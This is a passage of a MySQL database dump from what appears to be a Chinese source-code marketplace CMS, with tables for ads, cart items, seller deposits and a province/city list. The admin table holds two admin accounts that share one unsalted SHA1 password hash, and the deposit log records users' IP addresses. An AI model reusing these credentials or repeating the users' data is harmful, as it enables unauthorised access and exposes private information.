(304, '0708331001560113275', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:47:55', '', NULL, 9, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(305, '0097192001560114604', '图片', 'jpg', '', '928vip_qh', '', '2019-06-10 05:10:04', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(306, '0878558001560114626', '图片', 'jpg', '', '928vip_qh', '', '2019-06-10 05:10:26', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(307, '0349700001560115082', '图片', 'jpg', '首页商品列表左侧上方广告', '928vip_01', '', '2019-06-10 05:18:02', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(308, '0543584001560115108', '图片', 'jpg', '首页商品列表左侧上方广告', '928vip_01', '', '2019-06-10 05:18:28', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(309, '0033816001560115132', '图片', 'jpg', '', '928vip_02', '', '2019-06-10 05:18:52', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(310, '0233083001560115155', '图片', 'png', '', '928vip_02', '', '2019-06-10 05:19:15', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(313, '0433333001560868573', '文字', '', '熊掌号推送记录', 'ADCJ01', '', '2019-06-18 22:36:13', 'tuisong.php', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(331, '0753931001570072163', '文字', '', '一键生成sitemap', 'ADCJ01', '', '2019-10-03 11:09:23', 'chajian_sitemap_builder.php', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(315, '0784092001561063203', '图片', 'jpg', '', 'ppt_qh', '', '2019-06-21 04:40:03', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(317, '0953828001561063393', '图片', 'jpg', '', 'ppt_qh', '', '2019-06-21 04:43:13', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(318, '0941301001561063461', '图片', 'png', '', 'ppt_07', '', '2019-06-21 04:44:21', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(319, '0481317001561063476', '图片', 'png', '', 'ppt_07', '', '2019-06-21 04:44:36', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(320, '0023826001561063485', '图片', 'png', '', 'ppt_07', '', '2019-06-21 04:44:45', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(321, '0232858001561063494', '图片', 'png', '', 'ppt_07', '', '2019-06-21 04:44:54', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(322, '0970427001561063503', '图片', 'png', '', 'ppt_07', '', '2019-06-21 04:45:03', '', NULL, 5, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(323, '0640824001561063514', '图片', 'png', '', 'ppt_07', '', '2019-06-21 04:45:14', '', NULL, 6, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(324, '0706863001561064071', '图片', 'jpg', '', 'ppt_01', '', '2019-06-21 04:54:31', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(325, '0950000001561064260', '图片', 'jpg', '', 'ppt_02', '', '2019-06-21 04:57:40', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(326, '0691818001561064480', '图片', 'jpg', '', 'ppt_01', '', '2019-06-21 05:01:20', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(327, '0195949001561064494', '图片', 'jpg', '', 'ppt_02', '', '2019-06-21 05:01:34', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(328, '0777355001561064523', '图片', 'jpg', '', 'ppt_04', '', '2019-06-21 05:02:03', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(329, '0458815001561064546', '图片', 'jpg', '', 'ppt_05', '', '2019-06-21 05:02:26', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(330, '0042051001561064560', '图片', 'jpg', '', 'ppt_05', '', '2019-06-21 05:02:40', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(332, '0518204001570072278', '文字', '', '百度链接主动提交', 'ADCJ01', '', '2019-10-03 11:11:18', 'chajian_pushLink2Baidu.php', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_adlx`
--

CREATE TABLE IF NOT EXISTS `yjcode_adlx` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `adbh` char(50) DEFAULT NULL,
  `maxnum` int(10) DEFAULT NULL,
  `adw` int(10) DEFAULT NULL,
  `adh` int(10) DEFAULT NULL,
  `adty` char(50) DEFAULT NULL,
  `fflx` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `tianshu` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=14 ;

--
-- 转存表中的数据 `yjcode_adlx`
--

INSERT INTO `yjcode_adlx` (`id`, `bh`, `tit`, `adbh`, `maxnum`, `adw`, `adh`, `adty`, `fflx`, `admin`, `xh`, `money1`, `tianshu`, `sj`, `zt`) VALUES
(1, '1488459491a89', '商品详情页左侧广告', 'ADP01', 3, 200, 200, 'xcf1xcf', 2, 1, NULL, NULL, NULL, '2017-03-02 20:58:11', 0),
(2, '1488459491a89', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 1, 100, 5, '2017-03-02 20:59:51', NULL),
(3, '1488459491a89', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 1, 180, 10, '2017-03-02 20:59:51', NULL),
(4, '1488459491a89', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 2, 90, 5, '2017-03-02 20:59:51', NULL),
(5, '1488459491a89', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 2, 160, 10, '2017-03-02 20:59:51', NULL),
(6, '1488459491a89', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 3, 80, 5, '2017-03-02 20:59:51', NULL),
(7, '1488459491a89', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 3, 140, 10, '2017-03-02 20:59:51', NULL),
(8, '1488459595a48', '商家列表页面左侧广告', 'ADS01', 4, 200, 200, 'xcf1xcf', 1, 1, NULL, NULL, NULL, '2017-03-02 20:59:55', 0),
(9, '1488459595a48', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 10, 1, '2017-03-02 21:01:00', NULL),
(10, '1488459595a48', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 27, 3, '2017-03-02 21:01:00', NULL),
(11, '1488459595a48', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 40, 5, '2017-03-02 21:01:00', NULL),
(12, '1488459595a48', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 49, 7, '2017-03-02 21:01:00', NULL),
(13, '1488459595a48', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 60, 10, '2017-03-02 21:01:00', NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_admin`
--

CREATE TABLE IF NOT EXISTS `yjcode_admin` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `adminuid` char(50) DEFAULT NULL,
  `adminpwd` char(50) DEFAULT NULL,
  `uname` char(50) DEFAULT NULL,
  `qx` varchar(250) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=102 ;

--
-- 转存表中的数据 `yjcode_admin`
--

INSERT INTO `yjcode_admin` (`id`, `adminuid`, `adminpwd`, `uname`, `qx`) VALUES
(6, 'admin888', 'eaeb8c1250f18a13b72c212ceb85f4cfc100f817', 'admin888', ',0101,0102,0201,0202,0203,0302,0401,0402,0403,0601,0602,0701,0702,'),
(101, 'admin', 'eaeb8c1250f18a13b72c212ceb85f4cfc100f817', NULL, ',0,');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_baomoneyrecord`
--

CREATE TABLE IF NOT EXISTS `yjcode_baomoneyrecord` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `moneynum` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `ztsm` varchar(230) DEFAULT NULL,
  `infbh` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=10 ;

--
-- 转存表中的数据 `yjcode_baomoneyrecord`
--

INSERT INTO `yjcode_baomoneyrecord` (`id`, `bh`, `userid`, `tit`, `moneynum`, `sj`, `uip`, `admin`, `zt`, `ztsm`, `infbh`) VALUES
(1, '1493649284', 15, '缴纳保证金', 3000, '2017-05-01 22:34:44', '124.231.162.4', NULL, 0, NULL, NULL),
(2, '1493914182', 45, '缴纳保证金', 0.01, '2017-05-05 00:09:42', '113.80.11.191', NULL, 0, NULL, NULL),
(3, '1510679783', 15, '保证金扣除', -3000, '2017-11-15 01:16:23', '127.0.0.1', 0, 0, NULL, NULL),
(4, '1510679852', 15, '保证金充值', 100, '2017-11-15 01:17:32', '127.0.0.1', 0, 0, NULL, NULL),
(5, '1510680498', 15, '保证金扣除', -100, '2017-11-15 01:28:18', '127.0.0.1', 0, 0, NULL, NULL),
(6, '1510691769', 15, '保证金充值', 1000, '2017-11-15 04:36:09', '127.0.0.1', 0, 0, NULL, NULL),
(7, '1511639273', 134, '缴纳保证金', 0.01, '2017-11-26 03:47:53', '120.229.3.193', 0, 0, NULL, NULL),
(8, '1511639298', 134, '解冻保证金', -0.01, '2017-11-26 03:48:18', '120.229.3.193', 0, 1, NULL, NULL),
(9, '1524977169', 159, '缴纳保证金', 0.01, '2018-04-29 12:46:09', '111.182.120.36', 0, 0, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_car`
--

CREATE TABLE IF NOT EXISTS `yjcode_car` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `probh` char(50) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `num` int(11) DEFAULT NULL,
  `tcid` int(10) DEFAULT '0',
  `shdzid` int(10) DEFAULT NULL,
  `bz` text,
  `tcv` varchar(220) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `shdz` varchar(220) DEFAULT NULL,
  `yunfei` int(10) DEFAULT NULL,
  `tcfhxs` int(10) DEFAULT NULL,
  `selluserid` int(10) DEFAULT NULL,
  `buyform` text,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=185 ;

--
-- 转存表中的数据 `yjcode_car`
--

INSERT INTO `yjcode_car` (`id`, `probh`, `userid`, `sj`, `num`, `tcid`, `shdzid`, `bz`, `tcv`, `money1`, `shdz`, `yunfei`, `tcfhxs`, `selluserid`, `buyform`) VALUES
(159, '1554036580-15', 846, '2019-04-24 17:30:33', 1, 0, NULL, NULL, '', 3600, '', 0, 99, 15, ''),
(161, '1554036494-15', 847, '2019-04-25 10:50:35', 1, 0, NULL, NULL, '', 3600, '', 0, 99, 15, ''),
(162, '1554034828-15', 848, '2019-04-27 02:52:29', 1, 0, NULL, NULL, '', 400, '', 0, 99, 15, ''),
(164, '1557221794-15', 45, '2019-05-12 01:17:54', 1, 0, NULL, NULL, '', 30, '', 0, 99, 15, ''),
(175, '1554036529-15', 955, '2019-05-13 15:46:51', 1, 0, NULL, NULL, '', 600, '', 0, 99, 15, ''),
(180, '1554035421-15', 964, '2019-06-14 09:50:07', 1, 0, NULL, NULL, '', 6000, '', 0, 0, 15, ''),
(177, '1554036580-15', 961, '2019-06-06 16:02:42', 1, 0, 18, NULL, '', 3600, '', 0, 0, 15, '');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_chajian`
--

CREATE TABLE IF NOT EXISTS `yjcode_chajian` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `cjbh` char(50) DEFAULT NULL,
  `tit` char(50) DEFAULT NULL,
  `txt` text,
  `var1` text,
  `var2` text,
  `var3` text,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_city`
--

CREATE TABLE IF NOT EXISTS `yjcode_city` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(40) DEFAULT NULL,
  `name1` char(40) DEFAULT NULL,
  `level` int(11) DEFAULT NULL,
  `parentid` char(30) DEFAULT NULL,
  `xh` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=3629 ;

--
-- 转存表中的数据 `yjcode_city`
--

INSERT INTO `yjcode_city` (`id`, `bh`, `name1`, `level`, `parentid`, `xh`) VALUES
(1, '111', '北京', 1, '0', 0),
(2, '112', '天津', 1, '0', 0),
(3, '113', '河北', 1, '0', 0),
(4, '114', '山西', 1, '0', 0),
(5, '115', '内蒙古', 1, '0', 0),
(6, '121', '辽宁', 1, '0', 0),
(7, '122', '吉林', 1, '0', 0),
(8, '123', '黑龙江', 1, '0', 0),
(9, '131', '上海', 1, '0', 0),
(10, '132', '江苏', 1, '0', 0),
(11, '133', '浙江', 1, '0', 0),
(12, '134', '安徽', 1, '0', 0),
(13, '135', '福建', 1, '0', 0),
(14, '136', '江西', 1, '0', 0),
(15, '137', '山东', 1, '0', 0),
(16, '141', '河南', 1, '0', 0),
(17, '142', '湖北', 1, '0', 0),
(18, '143', '湖南', 1, '0', 0),
(19, '144', '广东', 1, '0', 0),
(20, '145', '广西', 1, '0', 0),
(21, '146', '海南', 1, '0', 0),
(22, '150', '重庆', 1, '0', 0),
(23, '151', '四川', 1, '0', 0),
(24, '152', '贵州', 1, '0', 0),
(25, '153', '云南', 1, '0', 0),
(26, '154', '西藏', 1, '0', 0),
(27, '161', '陕西', 1, '0', 0),
(28, '162', '甘肃', 1, '0', 0),
(29, '163', '青海', 1, '0', 0),
(30, '164', '宁夏', 1, '0', 0),
(31, '165', '新疆', 1, '0', 0),
(32, '171', '台湾', 1, '0', 0),
(33, '172', '香港', 1, '0', 0),
(34, '173', '澳门', 1, '0', 0),
(35, '1', '北京市', 2, '111', 0),
(36, '14', '天津市', 2, '112', 0),
(37, '601', '石家庄市', 2, '113', 0),
(38, '605', '唐山市', 2, '113', 0),
(39, '604', '秦皇岛市', 2, '113', 0),
(40, '607', '邯郸市', 2, '113', 0),
(41, '606', '邢台市', 2, '113', 0),
(42, '608', '保定市', 2, '113', 0),
(43, '602', '张家口市', 2, '113', 0),
(44, '603', '承德市', 2, '113', 0),
(45, '609', '沧州市', 2, '113', 0),
(46, '610', '廊坊市', 2, '113', 0),
(47, '11311', '衡水市', 2, '113', 0),
(48, '9906', '其他城市', 2, '113', 0),
(49, '1201', '太原市', 2, '114', 0),
(50, '1202', '大同市', 2, '114', 0),
(51, '1204', '阳泉市', 2, '114', 0),
(52, '1206', '长治市', 2, '114', 0),
(53, '1205', '晋城市', 2, '114', 0),
(54, '1207', '晋中市', 2, '114', 0),
(55, '1210', '运城市', 2, '114', 0),
(56, '1224', '忻州市', 2, '114', 0),
(57, '1211', '临汾市', 2, '114', 0),
(58, '11410', '吕梁市', 2, '114', 0),
(59, '1203', '朔州市', 2, '114', 0),
(60, '9912', '其他城市', 2, '114', 0),
(61, '1001', '呼和浩特市', 2, '115', 0),
(62, '1003', '包头市', 2, '115', 0),
(63, '1004', '赤峰市', 2, '115', 0),
(64, '1005', '通辽市', 2, '115', 0),
(65, '11505', '鄂尔多斯市', 2, '115', 0),
(66, '11506', '呼伦贝尔市', 2, '115', 0),
(67, '11507', '巴彦淖尔市', 2, '115', 0),
(68, '11508', '乌兰察布市', 2, '115', 0),
(69, '11509', '兴安盟', 2, '115', 0),
(70, '11510', '锡林郭勒盟', 2, '115', 0),
(71, '11511', '阿拉善盟', 2, '115', 0),
(72, '1002', '乌海市', 2, '115', 0),
(73, '9910', '其他城市', 2, '115', 0),
(74, '12', '沈阳市', 2, '121', 0),
(75, '906', '大连市', 2, '121', 0),
(76, '907', '鞍山市', 2, '121', 0),
(77, '905', '抚顺市', 2, '121', 0),
(78, '915', '本溪市', 2, '121', 0),
(79, '908', '丹东市', 2, '121', 0),
(80, '910', '锦州市', 2, '121', 0),
(81, '909', '营口市', 2, '121', 0),
(82, '911', '辽阳市', 2, '121', 0),
(83, '914', '盘锦市', 2, '121', 0),
(84, '904', '铁岭市', 2, '121', 0),
(85, '902', '朝阳市', 2, '121', 0),
(86, '912', '葫芦岛市', 2, '121', 0),
(87, '903', '阜新市', 2, '121', 0),
(88, '9909', '其他城市', 2, '121', 0),
(89, '801', '长春市', 2, '122', 0),
(90, '804', '吉林市', 2, '122', 0),
(91, '805', '四平市', 2, '122', 0),
(92, '12204', '辽源市', 2, '122', 0),
(93, '807', '通化市', 2, '122', 0),
(94, '12206', '白山市', 2, '122', 0),
(95, '803', '松原市', 2, '122', 0),
(96, '802', '白城市', 2, '122', 0),
(97, '12209', '延边州', 2, '122', 0),
(98, '9908', '其他城市', 2, '122', 0),
(99, '701', '哈尔滨市', 2, '123', 0),
(100, '702', '齐齐哈尔市', 2, '123', 0),
(101, '708', '鸡西市', 2, '123', 0),
(102, '709', '鹤岗市', 2, '123', 0),
(103, '12305', '双鸭山市', 2, '123', 0),
(104, '704', '大庆市', 2, '123', 0),
(105, '705', '伊春市', 2, '123', 0),
(106, '706', '佳木斯市', 2, '123', 0),
(107, '12309', '七台河市', 2, '123', 0),
(108, '707', '牡丹江市', 2, '123', 0),
(109, '703', '黑河市', 2, '123', 0),
(110, '12312', '绥化市', 2, '123', 0),
(111, '12313', '大兴安岭地区', 2, '123', 0),
(112, '9907', '其他城市', 2, '123', 0),
(113, '3', '上海市', 2, '131', 0),
(114, '1601', '南京市', 2, '132', 0),
(115, '1607', '无锡市', 2, '132', 0),
(116, '1603', '徐州市', 2, '132', 0),
(117, '1608', '常州市', 2, '132', 0),
(118, '1602', '苏州市', 2, '132', 0),
(119, '1620', '南通市', 2, '132', 0),
(120, '1604', '连云港市', 2, '132', 0),
(121, '1606', '淮安市', 2, '132', 0),
(122, '13209', '盐城市', 2, '132', 0),
(123, '1610', '扬州市', 2, '132', 0),
(124, '1609', '镇江市', 2, '132', 0),
(125, '1612', '泰州市', 2, '132', 0),
(126, '1605', '宿迁市', 2, '132', 0),
(127, '9916', '其他城市', 2, '132', 0),
(128, '1901', '杭州市', 2, '133', 0),
(129, '1905', '宁波市', 2, '133', 0),
(130, '1906', '温州市', 2, '133', 0),
(131, '1903', '嘉兴市', 2, '133', 0),
(132, '1902', '湖州市', 2, '133', 0),
(133, '1914', '绍兴市', 2, '133', 0),
(134, '1910', '金华市', 2, '133', 0),
(135, '1908', '衢州市', 2, '133', 0),
(136, '1904', '舟山市', 2, '133', 0),
(137, '1939', '台州市', 2, '133', 0),
(138, '1943', '丽水市', 2, '133', 0),
(139, '9919', '其他城市', 2, '133', 0),
(140, '1501', '合肥市', 2, '134', 0),
(141, '1508', '芜湖市', 2, '134', 0),
(142, '1506', '蚌埠市', 2, '134', 0),
(143, '1503', '淮南市', 2, '134', 0),
(144, '1510', '马鞍山市', 2, '134', 0),
(145, '1502', '淮北市', 2, '134', 0),
(146, '1514', '铜陵市', 2, '134', 0),
(147, '1516', '安庆市', 2, '134', 0),
(148, '1507', '黄山市', 2, '134', 0),
(149, '1505', '滁州市', 2, '134', 0),
(150, '1513', '阜阳市', 2, '134', 0),
(151, '1509', '宿州市', 2, '134', 0),
(152, '1511', '巢湖市', 2, '134', 0),
(153, '1521', '六安市', 2, '134', 0),
(154, '1504', '亳州市', 2, '134', 0),
(155, '1519', '池州市', 2, '134', 0),
(156, '1515', '宣城市', 2, '134', 0),
(157, '9915', '其他城市', 2, '134', 0),
(158, '2101', '福州市', 2, '135', 0),
(159, '2105', '厦门市', 2, '135', 0),
(160, '2103', '莆田市', 2, '135', 0),
(161, '2102', '三明市', 2, '135', 0),
(162, '2104', '泉州市', 2, '135', 0),
(163, '2106', '漳州市', 2, '135', 0),
(164, '2107', '南平市', 2, '135', 0),
(165, '2113', '龙岩市', 2, '135', 0),
(166, '2109', '宁德市', 2, '135', 0),
(167, '9921', '其他城市', 2, '135', 0),
(168, '2001', '南昌市', 2, '136', 0),
(169, '2003', '景德镇市', 2, '136', 0),
(170, '2006', '萍乡市', 2, '136', 0),
(171, '2002', '九江市', 2, '136', 0),
(172, '2005', '新余市', 2, '136', 0),
(173, '2004', '鹰潭市', 2, '136', 0),
(174, '2008', '赣州市', 2, '136', 0),
(175, '2007', '吉安市', 2, '136', 0),
(176, '2012', '宜春市', 2, '136', 0),
(177, '2009', '抚州市', 2, '136', 0),
(178, '2011', '上饶市', 2, '136', 0),
(179, '9920', '其他城市', 2, '136', 0),
(180, '1101', '济南市', 2, '137', 0),
(181, '1106', '青岛市', 2, '137', 0),
(182, '1104', '淄博市', 2, '137', 0),
(183, '13704', '枣庄市', 2, '137', 0),
(184, '1105', '东营市', 2, '137', 0),
(185, '1110', '烟台市', 2, '137', 0),
(186, '1103', '潍坊市', 2, '137', 0),
(187, '1113', '威海市', 2, '137', 0),
(188, '13710', '济宁市', 2, '137', 0),
(189, '13711', '泰安市', 2, '137', 0),
(190, '1108', '日照市', 2, '137', 0),
(191, '1112', '莱芜市', 2, '137', 0),
(192, '1107', '临沂市', 2, '137', 0),
(193, '1102', '德州市', 2, '137', 0),
(194, '1115', '聊城市', 2, '137', 0),
(195, '1109', '滨州市', 2, '137', 0),
(196, '13718', '菏泽市', 2, '137', 0),
(197, '9911', '其他城市', 2, '137', 0),
(198, '14118', '济源市', 2, '141', 0),
(199, '1401', '郑州市', 2, '141', 0),
(200, '1408', '开封市', 2, '141', 0),
(201, '1403', '洛阳市', 2, '141', 0),
(202, '1413', '平顶山市', 2, '141', 0),
(203, '1404', '焦作市', 2, '141', 0),
(204, '1411', '鹤壁市', 2, '141', 0),
(205, '1405', '新乡市', 2, '141', 0),
(206, '1406', '安阳市', 2, '141', 0),
(207, '1414', '濮阳市', 2, '141', 0),
(208, '1409', '许昌市', 2, '141', 0),
(209, '1407', '漯河市', 2, '141', 0),
(210, '1402', '三门峡市', 2, '141', 0),
(211, '1415', '南阳市', 2, '141', 0),
(212, '1412', '商丘市', 2, '141', 0),
(213, '1410', '信阳市', 2, '141', 0),
(214, '14116', '周口市', 2, '141', 0),
(215, '1416', '驻马店市', 2, '141', 0),
(216, '9914', '其他城市', 2, '141', 0),
(217, '16', '武汉市', 2, '142', 0),
(218, '1708', '黄石市', 2, '142', 0),
(219, '1706', '襄樊市', 2, '142', 0),
(220, '1702', '十堰市', 2, '142', 0),
(221, '1714', '荆州市', 2, '142', 0),
(222, '1709', '宜昌市', 2, '142', 0),
(223, '1704', '荆门市', 2, '142', 0),
(224, '1710', '鄂州市', 2, '142', 0),
(225, '1705', '孝感市', 2, '142', 0),
(226, '1712', '黄冈市', 2, '142', 0),
(227, '1713', '咸宁市', 2, '142', 0),
(228, '14212', '随州市', 2, '142', 0),
(229, '14213', '恩施州', 2, '142', 0),
(230, '1707', '仙桃市', 2, '142', 0),
(231, '14215', '潜江市', 2, '142', 0),
(232, '14216', '天门市', 2, '142', 0),
(233, '14217', '神农架林区', 2, '142', 0),
(234, '9917', '其他城市', 2, '142', 0),
(235, '1801', '长沙市', 2, '143', 0),
(236, '1811', '株洲市', 2, '143', 0),
(237, '1803', '湘潭市', 2, '143', 0),
(238, '1808', '衡阳市', 2, '143', 0),
(239, '1810', '邵阳市', 2, '143', 0),
(240, '1807', '岳阳市', 2, '143', 0),
(241, '1805', '常德市', 2, '143', 0),
(242, '1802', '张家界市', 2, '143', 0),
(243, '1806', '益阳市', 2, '143', 0),
(244, '1809', '郴州市', 2, '143', 0),
(245, '14311', '永州市', 2, '143', 0),
(246, '1804', '怀化市', 2, '143', 0),
(247, '1812', '娄底市', 2, '143', 0),
(248, '14314', '湘西州', 2, '143', 0),
(249, '9918', '其他城市', 2, '143', 0),
(250, '5', '广州市', 2, '144', 0),
(251, '7', '深圳市', 2, '144', 0),
(252, '504', '珠海市', 2, '144', 0),
(253, '507', '汕头市', 2, '144', 0),
(254, '533', '韶关市', 2, '144', 0),
(255, '521', '佛山市', 2, '144', 0),
(256, '509', '江门市', 2, '144', 0),
(257, '516', '湛江市', 2, '144', 0),
(258, '511', '茂名市', 2, '144', 0),
(259, '534', '肇庆市', 2, '144', 0),
(260, '508', '惠州市', 2, '144', 0),
(261, '545', '梅州市', 2, '144', 0),
(262, '529', '汕尾市', 2, '144', 0),
(263, '544', '河源市', 2, '144', 0),
(264, '531', '阳江市', 2, '144', 0),
(265, '512', '清远市', 2, '144', 0),
(266, '510', '东莞市', 2, '144', 0),
(267, '515', '中山市', 2, '144', 0),
(268, '506', '潮州市', 2, '144', 0),
(269, '540', '揭阳市', 2, '144', 0),
(270, '546', '云浮市', 2, '144', 0),
(271, '9905', '其他城市', 2, '144', 0),
(272, '2201', '南宁市', 2, '145', 0),
(273, '2203', '柳州市', 2, '145', 0),
(274, '2202', '桂林市', 2, '145', 0),
(275, '2204', '梧州市', 2, '145', 0),
(276, '2206', '北海市', 2, '145', 0),
(277, '14506', '防城港市', 2, '145', 0),
(278, '2205', '钦州市', 2, '145', 0),
(279, '14508', '贵港市', 2, '145', 0),
(280, '2207', '玉林市', 2, '145', 0),
(281, '14510', '百色市', 2, '145', 0),
(282, '14511', '贺州市', 2, '145', 0),
(283, '14512', '河池市', 2, '145', 0),
(284, '14513', '来宾市', 2, '145', 0),
(285, '14514', '崇左市', 2, '145', 0),
(286, '9922', '其他城市', 2, '145', 0),
(287, '2301', '海口市', 2, '146', 0),
(288, '2302', '三亚市', 2, '146', 0),
(289, '2303', '文昌市', 2, '146', 0),
(290, '2304', '琼海市', 2, '146', 0),
(291, '2305', '万宁市', 2, '146', 0),
(292, '14606', '五指山市', 2, '146', 0),
(293, '14607', '东方市', 2, '146', 0),
(294, '14608', '儋州市', 2, '146', 0),
(295, '14609', '临高县', 2, '146', 0),
(296, '14610', '澄迈县', 2, '146', 0),
(297, '14611', '定安县', 2, '146', 0),
(298, '14612', '屯昌县', 2, '146', 0),
(299, '14613', '昌江县', 2, '146', 0),
(300, '14614', '白沙县', 2, '146', 0),
(301, '14615', '琼中县', 2, '146', 0),
(302, '14616', '陵水县', 2, '146', 0),
(303, '14617', '保亭县', 2, '146', 0),
(304, '14618', '乐东县', 2, '146', 0),
(305, '14619', '西南中沙群岛办事处（县级）', 2, '146', 0),
(306, '9923', '其他城市', 2, '146', 0),
(307, '401', '重庆市', 2, '150', 0),
(308, '3001', '成都市', 2, '151', 0),
(309, '3010', '自贡市', 2, '151', 0),
(310, '15103', '攀枝花市', 2, '151', 0),
(311, '3009', '泸州市', 2, '151', 0),
(312, '3005', '德阳市', 2, '151', 0),
(313, '3007', '绵阳市', 2, '151', 0),
(314, '3013', '广元市', 2, '151', 0),
(315, '15108', '遂宁市', 2, '151', 0),
(316, '15109', '内江市', 2, '151', 0),
(317, '3012', '乐山市', 2, '151', 0),
(318, '3008', '南充市', 2, '151', 0),
(319, '15112', '宜宾市', 2, '151', 0),
(320, '15113', '广安市', 2, '151', 0),
(321, '15114', '达州市', 2, '151', 0),
(322, '15115', '眉山市', 2, '151', 0),
(323, '15116', '雅安市', 2, '151', 0),
(324, '15117', '巴中市', 2, '151', 0),
(325, '15118', '资阳市', 2, '151', 0),
(326, '15119', '阿坝州', 2, '151', 0),
(327, '15120', '甘孜州', 2, '151', 0),
(328, '15121', '凉山州', 2, '151', 0),
(329, '9930', '其他城市', 2, '151', 0),
(330, '2501', '贵阳市', 2, '152', 0),
(331, '2502', '六盘水市', 2, '152', 0),
(332, '2503', '遵义市', 2, '152', 0),
(333, '2504', '安顺市', 2, '152', 0),
(334, '15205', '铜仁地区', 2, '152', 0),
(335, '2505', '毕节地区', 2, '152', 0),
(336, '15207', '黔西南州', 2, '152', 0),
(337, '15208', '黔东南州', 2, '152', 0),
(338, '15209', '黔南州', 2, '152', 0),
(339, '9925', '其他城市', 2, '152', 0),
(340, '2401', '昆明市', 2, '153', 0),
(341, '2402', '曲靖市', 2, '153', 0),
(342, '2403', '玉溪市', 2, '153', 0),
(343, '2404', '保山市', 2, '153', 0),
(344, '15306', '昭通市', 2, '153', 0),
(345, '2405', '丽江市', 2, '153', 0),
(346, '15308', '普洱市', 2, '153', 0),
(347, '15309', '临沧市', 2, '153', 0),
(348, '15310', '文山州', 2, '153', 0),
